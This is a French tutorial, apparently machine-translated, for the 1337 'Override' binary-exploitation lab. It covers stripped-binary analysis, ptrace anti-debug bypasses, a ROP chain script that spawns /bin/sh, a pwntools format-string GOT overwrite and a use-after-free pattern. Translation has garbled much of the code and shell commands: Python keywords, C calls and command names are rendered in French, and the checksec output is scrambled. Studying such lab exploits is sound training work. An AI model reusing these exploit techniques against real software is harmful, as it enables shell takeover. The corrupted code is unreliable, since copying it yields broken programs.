# Introduction :

L'ingénierie inverse consiste à désassembler et à analyser les exécutables binaires compilés pour en déduire leur logique, leur structure et leurs vulnérabilités potentielles sans accès au code source d'origine. Dans une exploitation avancée, les attaquants doivent contourner les mécanismes de protection binaire appliqués par le compilateur et le système d'exploitation, tels que ASLR (Address Space Layout Randomization), NX/DEP (No-Execute bit), Stack Canaries et PIE (Position Independent Executables). Override est le projet où toutes ces protections entrent en collision, et le développeur de l'exploit doit les vaincre méthodiquement.

# Objectifs du projet :

Override est le point culminant de la piste de sécurité du système 1337, s’appuyant directement sur les fondations posées par Rainfall et Snow Crash. Cela nécessite une ingénierie inverse intense de binaires ELF x86 32 bits supprimés. L'objectif est de contourner les contrôles logiques, de démanteler les exécutables de style bomb-lab et d'exploiter des vulnérabilités complexes de corruption de mémoire, notamment les bogues de formatage de chaîne et l'utilisation après libération (UAF), afin d'obtenir un shell racine à chaque niveau.

# Présentation des protections binaires :

Avant de plonger dans chaque niveau, il est essentiel de comprendre quelles défenses le binaire utilise. Utilisez `checksec` (à partir de la suite `pwntools` ou en tant que script autonome) pour auditer les indicateurs de protection :

$ checksec --file=./level01 [*] './level01' Arch : i386-32-little RELRO : Pile RELRO partielle : Aucun canari trouvé NX : NX activé PIE : Pas de PIE (0x8048000)

| Protection | Description | Impact on Exploitation |
|---|---|---|
| **ASLR** | OS randomizes base addresses of stack, heap, and libraries at each run | Breaks hardcoded addresses; requires info-leak or brute force |
| **NX/DEP** | Stack and heap pages are marked non-executable | Shellcode injection on stack is blocked; requires ROP |
| **Stack Canary** | A random value placed before the saved return address | Overwrites are detected before function return |
| **PIE** | Binary itself is loaded at a random address | Breaks all hardcoded binary addresses; requires info-leak |
| **RELRO** | GOT (Global Offset Table) is made read-only | Blocks GOT overwrite technique |

# Procédure pas à pas :

:one : Analyse statique des binaires supprimés :

Un binaire supprimé manque de symboles de débogage (noms de fonctions, noms de variables). Utilisez des outils tels que `objdump`, Ghidra ou IDA Pro pour désassembler et décompiler le binaire en pseudocode de type C. La première étape consiste toujours à comprendre la structure globale du binaire.

$ file ./level01 level01 : exécutable ELF 32 bits LSB, Intel 80386, lié dynamiquement, supprimé

$ objdump -d -M intel ./level01 | tête -50

$ chaînes ./level01 | grep -i "pass\|auth\|flag\|win"

Dans Ghidra, chargez le binaire et laissez l'auto-analyseur fonctionner. Accédez au point d'entrée (`_start`), identifiez l'appel à `__libc_start_main` et, à partir de là, localisez la fonction `main`. Renommez les fonctions et les variables au fur et à mesure que vous comprenez leur objectif pour reconstruire progressivement le code source.

:deux : Traçage dynamique avec GDB et PEDA :

Exécutez le binaire dans GDB augmenté de l'extension PEDA (Python Exploit Development Assistance) pour obtenir un contexte à code couleur, une génération de modèles et une recherche de décalage de modèle.

$ gdb -q ./level01 gdb-peda$ start gdb-peda$ fonctions d'information gdb-peda$ disas main

Suivez les appels système pour voir quels fichiers le programme lit, quelles sockets il ouvre et quels signaux il gère – révélant souvent des chemins codés en dur ou des entrées attendues :

$ strace ./level01 2>&1 | grep -E "ouvrir|lire|écrire" $ ltrace ./level01 2>&1 | grep -E "strcmp|strncmp|memcmp"

La sortie `ltrace` est particulièrement précieuse : si le programme appelle `strcmp(user_input, "s3cr3t_p4ss")`, le mot de passe correct est immédiatement visible dans la trace.

:trois : Reconstruire des énigmes logiques à partir de l'assemblage :

Certains niveaux nécessitent la saisie de structures de données précises ou de mots de passe dérivés de transformations mathématiques complexes intégrées dans le binaire. Analysez les instructions d’assemblage x86 pour inverser les opérations.

Exemple — une boucle de somme de contrôle trouvée via le pseudocode Ghidra :

; Reconstruisez la logique C suivante à partir de l'assembly : ; somme de contrôle int = 0 ;     ; pour (int je = 0; je < 8; i++) { ;     somme de contrôle ^= entrée[i] * (i + 1);     ; } ; if (somme de contrôle != 0xDEAD) { exit(1); }

; Equivalent d'assemblage : 08048450 <check> : 8048450 : xor eax, eax ; somme de contrôle = 0 8048452 : xor ecx, ecx ; i = 0 .loop : 8048454 : mov edx, [ebp+ecx-0x28] 8048458 : inc ecx 8048459 : imul edx, ecx 804845b : xor eax, edx ; somme de contrôle ^= input[i] * (i+1) 804845d : cmp ecx, 8 8048460 : jl .loop 8048462 : cmp eax, 0xDEAD 8048467 : échec de jne

Écrivez un petit script Python pour effectuer une force brute ou un calcul inversé de l'entrée requise :

#!/usr/bin/env python3 target = 0xDEAD # Résoudre les octets d'entrée qui produisent la somme de contrôle requise # ...

:quatre : Vaincre l'anti-débogage (vérifications ptrace) :

Les exécutables peuvent implémenter des vérifications `ptrace` pour détecter s'ils sont exécutés sous un débogueur. Si un débogueur est connecté, l'appel `ptrace(PTRACE_TRACEME, ...)` échoue (renvoie -1) et le programme se termine.

// Modèle anti-débogage en C : if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) { puts("Débogueur détecté !");         sortie(1);     }

**Méthode 1 — Corrigez la valeur de retour dans GDB :**

Définissez un point d'arrêt sur l'appel `ptrace`, laissez-le s'exécuter, puis écrasez manuellement `EAX` par `0` avant la comparaison :

gdb-peda$ break *0x08048512 gdb-peda$ run gdb-peda$ set $eax = 0 gdb-peda$ continuer

**Méthode 2 — NOP sur le saut conditionnel :**

Recherchez l'instruction `jl`/`jne` qui suit la vérification en mémoire et corrigez les octets vers `0x90 0x90` (NOP NOP) à l'aide de la commande `set` de GDB :

gdb-peda$ défini *(court*)0x08048517 = 0x9090

**Méthode 3 — Crochet `LD_PRELOAD` :**

Écrivez une bibliothèque partagée qui remplace `ptrace` pour toujours renvoyer 0 :

// antidebug_bypass.c #include <sys/ptrace.h> long ptrace(enum __ptrace_request request, ...) { return 0;     }

$ gcc -shared -fPIC -o bypass.so antidebug_bypass.c $ LD_PRELOAD=./bypass.so ./level01

:five : Débordement de tampon basé sur la pile avec les chaînes ROP :

Lorsque NX est activé, la pile n'est pas exécutable, donc l'injection de shellcode classique est bloquée. Utilisez plutôt la **Programmation orientée retour (ROP)** : elle enchaîne de petites séquences de code exécutable existant (appelées "gadgets") se terminant par une instruction `ret` pour effectuer des opérations arbitraires.

**Étape 1 – Trouvez le décalage de débordement :**

gdb-peda$ pattern create 200 gdb-peda$ run <<< $(python3 -c "print('A'*200)") gdb-peda$ pattern offset $eip # Sortie : 112 trouvé au décalage : 112

**Étape 2 – Rechercher des gadgets ROP :**

$ ROPgadget --binary ./level01 --rop | grep "pop eax" 0x080484f3 : pop eax ; retraité

$ ROPgadget --binary ./level01 --rop | grep "int 0x80" 0x08048507 : int 0x80

**Étape 3 : Créez une chaîne ROP `execve("/bin/sh", NULL, NULL)` :**

Pour un appel système Linux `execve` 32 bits : `eax=0xb`, `ebx` → `/bin/sh`, `ecx=0`, `edx=0`.

#!/usr/bin/env python3 du pack d'importation de structure

padding = b'A' * 112 binsh_addr = 0x08049abc # adresse de la chaîne "/bin/sh" trouvée via ROPgadget ou des chaînes

rop = pack('<I', 0x080484f3) # pop eax ; ret rop += pack('<I', 0x0000000b) # numéro d'appel système pour l'exécutif rop += pack('<I', 0x080484e1) # pop ebx ; ret rop += pack('<I', binsh_addr) # ptr vers "/bin/sh" rop += pack('<I', 0x080484d2) # pop ecx ; pop edx ; ret rop += pack('<I', 0x00000000) # ecx = NULL rop += pack('<I', 0x00000000) # edx = NULL rop += pack('<I', 0x08048507) # int 0x80

payload = padding + rop avec open('/tmp/payload', 'wb') comme f: f.write(payload)

$ (cat /tmp/charge utile; chat) | ./level01 # Shell apparu !

:six: Exploitation des chaînes de format :

Une vulnérabilité de chaîne de format se produit lorsqu'une entrée contrôlée par l'utilisateur est transmise directement comme argument de format à `printf`, `sprintf` ou à des fonctions similaires. Cela permet de lire de la mémoire arbitraire (en utilisant `%x` ou `%s`) et, surtout, d'**écrire** des valeurs arbitraires sur des adresses mémoire arbitraires (en utilisant `%n`).

// Code vulnérable : printf(user_input);  // FAUX — devrait être printf("%s", user_input)

**Lecture de la pile :**

$ écho "%08x.%08x.%08x.%08x" | ./levelXX ffbe1234.00000000.08048abc.deadbeef

**Écrire à une adresse (écrasement GOT) :**

`%n` écrit le nombre d'octets imprimés jusqu'à présent à l'adresse pointée par l'argument correspondant. En élaborant soigneusement la chaîne de format et en contrôlant la pile, vous pouvez écraser l'entrée GOT d'une fonction telle que `exit` pour rediriger l'exécution vers `system` :

#!/usr/bin/env structure d'importation python3

# Remplacer l'entrée GOT pour exit() avec l'adresse de system() got_exit = 0x0804a018 # adresse de exit@got.plt addr_system = 0x080484b0 # adresse de system() ou one_gadget

# Utilisez pwntools fmtstr_payload pour l'automatisation : from pwn import * payload = fmtstr_payload(6, {got_exit: addr_system}) p = process('./levelXX') p.sendline(payload) p.interactive()

:seven : Exploitation du tas — Utilisation après libération (UAF) :

Une vulnérabilité Use-After-Free se produit lorsqu'un programme libère un morceau de tas et continue ensuite à utiliser un pointeur vers ce morceau. Un attaquant peut allouer un nouveau morceau de même taille, le remplissant de données contrôlées, que le programme interprète ensuite via le pointeur suspendu, ce qui conduit souvent à un détournement du pointeur de fonction.

// Modèle UAF simplifié : struct Auth { char name[32]; authentification int ; } ;     struct Service { char cmd[128]; } ;

struct Auth *a = malloc(sizeof(struct Auth));     gratuit(une);                    // Service de structure libéré authentifié *s = malloc(sizeof(struct Service)); // réutilise le même morceau strcpy(s->cmd, user_input);

if (a->auth) { // a est suspendu, lit dans la mémoire de s !         spawn_shell();     }

La stratégie d'exploitation :
1. Allouez la structure `Auth` et déclenchez le `free`.
2. Allouez la structure `Service` (même taille → même morceau de tas via les bacs glibc).
3. Écrivez une valeur non nulle au décalage correct dans `Service->cmd` afin que `a->auth` lit une valeur non nulle.
4. Déclenchez le chemin de code privilégié.

# Questions et réponses

:question : Qu'est-ce que cela signifie lorsqu'un binaire est « supprimé » ?

> La suppression d'un binaire supprime les informations symboliques (noms de fonctions, identifiants de variables et mappages de lignes sources) qui sont normalement intégrées pour le débogage. L'utilitaire `strip` (ou l'indicateur `-s` de GCC) effectue cette opération. Cela réduit considérablement la taille des fichiers mais oblige l'ingénierie inverse à travailler uniquement à partir d'adresses d'assemblage et de mémoire brutes. Les décompilateurs modernes comme Ghidra peuvent récupérer partiellement la structure en identifiant les signatures d'appel de bibliothèque courantes via les signatures FLIRT (Fast Library Identification and Recognition Technology).

:question : Qu'est-ce que le registre EAX et quels sont les registres à usage général en x86 ?

> En x86 32 bits, il existe huit registres à usage général. `EAX` (Accumulateur) stocke les résultats arithmétiques et la valeur de retour des appels de fonction (conformément à la convention cdecl). `EBX` (Base) est un registre à usage général enregistré par l'appelé, souvent utilisé comme pointeur de base dans l'adressage relatif GOT. `ECX` (Compteur) est utilisé dans les instructions de boucle et de chaîne. `EDX` (Data) est utilisé dans la multiplication/division et comme deuxième argument dans les appels système. `ESI`/`EDI` sont des registres d'index source et de destination pour les opérations sur les chaînes. `ESP` (Stack Pointer) pointe toujours vers le haut de la pile. `EBP` (Base Pointer) encadre la pile de la fonction actuelle.

:question : Qu'est-ce qu'une vulnérabilité ponctuelle et comment peut-elle conduire à l'exécution de code ?

> Une vulnérabilité « off-by-one » est une erreur de condition limite dans laquelle le code lit ou écrit exactement un élément au-delà du tampon prévu – généralement causée par l'utilisation de `<=` au lieu de `<` dans une boucle ou par une mauvaise gestion des terminateurs nuls. Sur la pile, un seul octet supplémentaire peut écraser l'octet de poids faible (LSB) du `EBP` enregistré. Cela décale le pointeur de trame jusqu'à 255 octets au retour de la fonction, redirigeant la pile vers les données contrôlées par l'attaquant lors de la prochaine instruction `ret` – une technique appelée « un par un dans EBP ».

:question : Qu'est-ce que la programmation orientée retour (ROP) et pourquoi est-elle nécessaire ?

> ROP est une technique d'exploitation qui contourne la protection de la mémoire NX/DEP, qui marque la pile et le tas comme non exécutables. Étant donné que l'injection classique de shellcode dans la pile provoquerait immédiatement une erreur de segmentation sur les systèmes compatibles NX, ROP enchaîne de petites séquences de code exécutable légitime existant appelé « gadgets », chacune se terminant par une instruction `ret`. En contrôlant soigneusement la pile avec une séquence d'adresses de gadgets et leurs arguments, un attaquant peut exécuter une logique arbitraire uniquement à partir de pages de codes existantes, qui sont toujours exécutables.

:question : Qu'est-ce que le Global Offset Table (GOT) et pourquoi est-il un objectif d'exploitation ?

> Lorsqu'un binaire Linux ELF appelle une fonction de bibliothèque partagée (par exemple, `printf`, `exit`, `system`), l'éditeur de liens utilise un mécanisme en deux étapes : la table de liaison de procédure (PLT) et la table de décalage global (GOT). Le GOT est une section de données inscriptible qui stocke les adresses d'exécution résolues des fonctions de bibliothèque. Lorsque `Partial RELRO` est en vigueur (valeur par défaut), le GOT est accessible en écriture. L'écrasement d'une entrée GOT (par exemple, en remplaçant l'adresse de `exit` par l'adresse de `system`) signifie que le prochain appel à `exit("/bin/sh")` dans le programme appellera en fait `system("/bin/sh")` à la place.

:question : Comment l'ASLR affecte-t-il l'exploitation et quels sont les contournements courants ?

> ASLR randomise les adresses de chargement de base de la pile, du tas et des bibliothèques partagées à chaque exécution, ce qui rend les adresses absolues codées en dur peu fiables. Les contournements courants incluent : **(1) Fuite d'informations** : recherche d'une vulnérabilité qui divulgue une adresse d'exécution (par exemple, une fuite de chaîne de format `%s` d'une entrée GOT) pour vaincre la randomisation et calculer d'autres adresses au moment de l'exécution. **(2) Brute Force** — sur les systèmes 32 bits, l'entropie ASLR n'est que d'environ 16 bits pour la pile, ce qui rend possible des devinettes répétées. **(3) Écrasement partiel** — écrase uniquement le(s) LSB d'un pointeur pour rediriger vers une adresse à proximité dans la même page chargée (qui n'est pas aléatoire).
